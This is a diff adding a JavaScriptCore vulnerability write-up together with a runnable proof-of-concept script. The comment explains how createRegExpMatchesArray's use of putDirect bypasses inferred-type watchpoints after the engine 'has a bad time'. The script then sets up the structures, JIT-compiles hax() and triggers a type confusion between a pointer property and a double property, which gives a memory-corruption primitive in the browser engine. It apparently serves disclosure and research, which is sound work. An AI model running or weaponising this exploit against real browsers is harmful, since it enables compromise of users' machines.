@@ -1,0 +1,201 @@
+/*
+Prerequisites
+-------------
+
+In JavaScriptCore, JSObjects have an associated Structure: an object describing various aspects of the JSObject such as its type, its properties, and the type of elements being stored (e.g. unboxed double or JSValues). Whenever a property is added to an object (or some other aspect of it is changed), a new structure is allocated which now also contains the new property. This "structure transition" is then cached so that the same structure can be reused for similar transitions in the future.
+
+Arrays in JavaScriptCore can have different indexing modes: the contiguous modes (ArrayWithInt32, ArrayWithDouble, ArrayWithContiguous), and modes used for sparse arrays (ArrayWitArrayStorage, ArrayWithSlowPutArrayStorage). JavaScriptCore has a notion of "having a bad time" (JSGlobalObject::haveABadTime). This is the case when an object in the array prototype chain has indexed accessors. In that case, the indexing mode of all arrays is switched to ArrayWithSlowPutStorage, which indicates that element stores to holes have to consult the prototype chain. The engine will "have a bad time" as soon as an object in the default prototype chain of Arrays has an indexed accessor.
+
+JavaScriptCore can track types of properties using the inferred type mechanism. Essentially, the first time a property is created, an inferred type for the property is installed and linked to the structure. The inferred type is based on the initial value of the property. For example: setting a property .x for the first time with a value of 42 would initialize the inferred type for .x to be "Int32". If the same property (on any Object referencing it) is assigned a new value, the inferred type for that property is "widened" to include all previous types and the new type. For example: if later on a double value is stored in property .x, the new inferred type for that property would be "Number". See InferredType::Descriptor::merge for the exact rules. Besides primitive types and "Object", inferred types can also be "ObjectWithStructure", in which case the property is known to be an object with a specific structure. The DFG and FTL JIT compilers make use of inferred types to omit type checks. Consider the following code:
+
+    function foo(o) {
+        return o.a.b;
+    }
+
+Assuming that the inferred type for the .a property is ObjectWithStructure, then the compiler is able to use the inferred type to omit the StructureCheck for o.a and will thus only emit a single StructureCheck for o.
+
+
+Vulnerability Details
+---------------------
+
+The inferred type mechanism is secured via watchpoints: whenever a piece of JIT code relies on inferred types, it installs a callback (called Watchpoint) on the inferred type to trigger whenever it is widened. In that case the JIT code is discarded as it is no longer safe to execute. Code that updates a property value is then required to check whether the inferred type is still consistent with the new value and if not widen it and trigger Watchpoints. This is done e.g. in Structure::willStoreValueForExistingTransition. As such, every "direct" property store, one that does not update inferred types, could now be a security bug as it could violate inferred types. JSObject::putDirect is such an example:
+
+    void putDirect(VM& vm, PropertyOffset offset, JSValue value) { locationForOffset(offset)->set(vm, this, value); }
+
+The function directly stores the provided value to the given property slot without accounting for inferred types, which the caller is supposed to do. Looking for cross references to said function leads to createRegExpMatchesArray (used e.g. for %String.prototype.match) which in essence does:
+
+    let array = newArrayWithStructure(regExpMatchesArrayWithGroupsStructure);
+    array->putDirect(vm, RegExpMatchesArrayIndexPropertyOffset, index)
+    array->putDirect(vm, RegExpMatchesArrayInputPropertyOffset, input)
+    array->putDirect(vm, RegExpMatchesArrayGroupsPropertyOffset, groups)
+
+As such, if it was possible to get the engine to set an inferred type for one of the three properties of the regExpMatchesArrayWithGroupsStructure structure, one could then invalidate the inferred type through %String.prototype.match without firing watchpoints. The regExpMatchesArrayWithGroupsStructure is created during initialization of the engine by following this pseudo code:
+
+    let structure = arrayStructureForIndexingTypeDuringAllocation(ArrayWithContiguous);
+    structure = Structure::addPropertyTransition(vm, structure, "index");
+    structure = Structure::addPropertyTransition(vm, structure, "input");
+    regExpMatchesArrayWithGroupsStructure = Structure::addPropertyTransition(vm, structure, "groups");
+
+It is thus possible to manually construct an object having the regExpMatchesArrayWithGroupsStructure as structure like this:
+
+    var a = ["a", "b", "c"];            // ArrayWithContiguous
+    a.index = 42;
+    a.input = "foo";
+    a.groups = null;
+
+Unfortunately, as the regExpMatchesArrayWithGroupsStructure is created at initialization time of the engine, no inferred type will be set for any of the properties as no property value is available for the initial structure transition.
+
+However, regExpMatchesArrayWithGroupsStructure is re-created when the engine is having a bad time. In that case, all arrays will now use ArrayWithSlowPutArrayStorage mode. For that reason, a new structure for regExpMatchesArrayWithGroupsStructure is created as well which now uses ArrayWithSlowPutArrayStorage instead of ArrayWithContiguous as base structure. As such, if somehow it was possible to create the resulting regExpMatchesArrayWithGroupsStructure before the engine has a bad time, then inferred types could be installed on said structure. It is rather tricky to construct an array that has the default array prototype and uses ArrayWithSlowPutArrayStorage mode, as that mode is only used when a prototype has indexed accessors. However, it is possible using the following code:
+
+    // Create a plain array with indexing type SlowPutArrayStorage. This is equivalent to
+    // `arrayStructureForIndexingTypeDuringAllocation(ArrayWithSlowPutArrayStorage)` in C++.
+    function createArrayWithSlowPutArrayStorage() {
+        let protoWithIndexedAccessors = {};
+        Object.defineProperty(protoWithIndexedAccessors, 1337, { get() { return 1337; } });
+
+        // Compile a function that will end up creating an array with SlowPutArrayStorage.
+        function helper(i) {
+            // After JIT compilation, this new Array call will construct a normal array (with the
+            // original Array prototype) with SlowPutArrayStorage due to profiling information from
+            // previous executions (which all ended up transitioning to SlowPutArrayStorage).
+            let a = new Array;
+            if (i > 0) {
+                // Convert the array to SlowPutArrayStorage by installing a prototype with indexed
+                // accessors. We can't directly use this object though as the prototype is different and
+                // thus the structure has changed.
+                Object.setPrototypeOf(a, protoWithIndexedAccessors);
+            }
+            return a;
+        }
+
+        for (let i = 1; i < 10000; i++) {
+            helper(i);
+        }
+
+        return helper(0);
+    }
+
+Once the helper function is JIT compiled, the profile information for the "new Array" operation will indicate that the resulting array will eventually use the ArrayWithSlowPutArrayStorage indexing mode. As such, the engine decides to directly allocate the object with ArrayWithSlowPutArrayStorage during `new Array` in the JIT code. By not going into the if branch it is possible to construct an array with SlowPutArrayStorage that never changed its prototype from the original array prototype (which causes a structure transition and as such cannot be used).
+
+From here, it is possible to create the same structure that will later become regExpMatchesArrayWithGroupsStructure after having a bad time:
+
+    let a = createArrayWithSlowPutArrayStorage();
+    a.index = 1337;
+    a.input = "foobar"
+    a.groups = obj;
+
+However, this time the engine will use inferred types for all properties since this is the first time the structure is created and all properties are initialized with values. With that, it is now possible to compile a function that uses these inferred types to omit type checks, such as:
+
+    // Install a global property with inferred type of ObjectWithStructure.
+    global = a;
+    // Must assign twice, otherwise JIT assumes 'global' is a constant.
+    global = a;
+
+    function hax() {
+        return global.groups.someProperty;
+    }
+
+This function will be compiled without any StructureCheck operations to perform runtime type checks as everything is based on inferred types.
+
+Next, String.match is invoked to produce an object with the same structure but which now violates the inferred type due to createRegExpMatchesArray using putDirect for the property store. The resulting object can safely be assigned to the 'global' variable as it has the same structure as before. Afterwards, the compiled function can be invoked again to cause a type confusion when accessing .someProperty because the .groups property now has a different Structure than indicated by its inferred type.
+
+To recap, the steps to achieve a type confusion between an object of type TX and an object of type TY, where both TX and TY can be arbitrarily chosen, are as follows:
+
+1. Let X and Y be two objects with structures S1 and S2 respectively (corresponding to type TX and type TY).
+2. Let O be an object with an out-of-line property whose value is X and inferred type thus TX. O will have structure S3.
+3. Create an array with unmodified prototype chain and SlowPutArrayStorage as described above. It will have structure S4 (plain array with SlowPutStorage).
+4. Add properties 'index', 'input', and 'groups' in that order to create structures S5, S6, and S7. Set the initial value of the 'groups' property to O so its inferred type will be ObjectWithStructure S3.
+5. Have a bad time: install an indexed accessor on the array prototype. This will cause arrays to be converted and regExpMatchesArrayWithGroupsStructure to be recreated. However, since the structure transitions already exist, regExpMatchesArrayWithGroupsStructure will become structure S7. The inferred types for S7 will not change since no property values are assigned.
+6. JIT compile a function that relies on the inferred type of the .groups property of structure S7 which is ObjectWithStructure S3.
+7. Call String.prototype.match to create an object M with structure S8, which, however, violates the inferred types as createRegExpMatchesArray uses putDirect.
+8. Set the first out-of-line property of M.groups to Y.
+9. Call the JIT compiled function with M. As M has structure S7, the code will not bail out, then access the first out-of-line property of M.groups believing it to be type TX while it really is type TY now.
+
+The attached PoC uses this to confuse an object with a double inline property with an object with a pointer inline property.
+*/
+
+// /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc poc.js
+// The PoC will confuse objX with objY.
+// objX will have structure S1, objY structure S2.
+let objX = {objProperty: {fetchme: 1234}};
+let objY = {doubleProperty: 2130562.5098039214};             // 0x4141414141414141 in memory
+
+// Create a plain array with indexing type SlowPutArrayStorage. This is equivalent to
+// `arrayStructureForIndexingTypeDuringAllocation(ArrayWithSlowPutArrayStorage)` in C++.
+function createArrayWithSlowPutArrayStorage() {
+    let protoWithIndexedAccessors = {};
+    Object.defineProperty(protoWithIndexedAccessors, 1337, { get() { return 1337; } });
+
+    // Compile a function that will end up creating an array with SlowPutArrayStorage.
+    function helper(i) {
+        // After JIT compilation, this new Array call will construct a normal array (with the
+        // original Array prototype) with SlowPutArrayStorage due to profiling information from
+        // previous executions (which all ended up transitioning to SlowPutArrayStorage).
+        let a = new Array;
+        if (i > 0) {
+            // Convert the array to SlowPutArrayStorage by installing a prototype with indexed
+            // accessors. This object can, however, not be used directly as the prototype is
+            // different and thus the structure has changed.
+            Object.setPrototypeOf(a, protoWithIndexedAccessors);
+        }
+        return a;
+    }
+
+    for (let i = 1; i < 10000; i++) {
+        helper(i);
+    }
+
+    return helper(0);
+}
+
+// Helper object using inferred types.
+let obj = {};
+obj.inlineProperty1 = 1337;
+obj.inlineProperty2 = 1338;
+obj.oolProperty1 = objX;        // Inferred type of 'oolProperty1' will be ObjectWithStructure S1.
+// 'obj' now has structure S3.
+
+// Create the same structure (S4) that will later (when having a bad time) be used as
+// regExpMatchesArrayWithGroupsStructure. Since property values are assigned during the initial
+// structure transition, inferred types for all property values are created.
+let a = createArrayWithSlowPutArrayStorage();       // a has Structure S4,
+a.index = 42;                                       // S5,
+a.input = "foobar";                                 // S6,
+a.groups = obj;                                     // and S7.
+// The inferred type for the .groups property will be ObjectWithStructure S3.
+
+// Inferred type for this property will be ObjectWithStructure S7.
+global = a;
+
+// Must assign twice so the JIT uses the inferred type instead of assuming that
+// the property is constant and installing a replacement watchpoint to
+// deoptimize whenever the property is replaced.
+global = a;
+
+// Have a bad time. This will attempt to recreate the global regExpMatchesArrayWithGroupsStructure
+// (to use an array with SlowPutArrayStorage), but since the same structure transitions were
+// performed before, it will actually reuse the existing structure S7. As no property values are
+// assigned, all inferred types for structure S7 will still be valid.
+Object.defineProperty(Array.prototype, 1337, { get() { return 1337; } });
+
+// Compile a function that uses the inferred value of 'global' to omit type checks.
+function hax() {
+    return global.groups.oolProperty1.objProperty.fetchme;
+}
+
+for (let i = 0; i < 10000; i++) {
+    hax(i);
+}
+
+// Create an ObjectWithStructure S7 which violates the inferred type of .groups (and potentially
+// other properties) due to createRegExpMatchesArray using putDirect.
+let match = "hax".match(/(?<oolProperty1>hax)/);
+
+// match.groups has structure S8 and so assignments to it won't invalidate inferred types of S7.
+match.groups.oolProperty1 = objY;       // This property overlaps with oolProperty1 of structure S3.
+
+// The inferred type for 'global' is ObjectWithStructure S4 so watchpoints will not be fired.
+global = match;
+
+// Trigger the type confusion.
+hax();
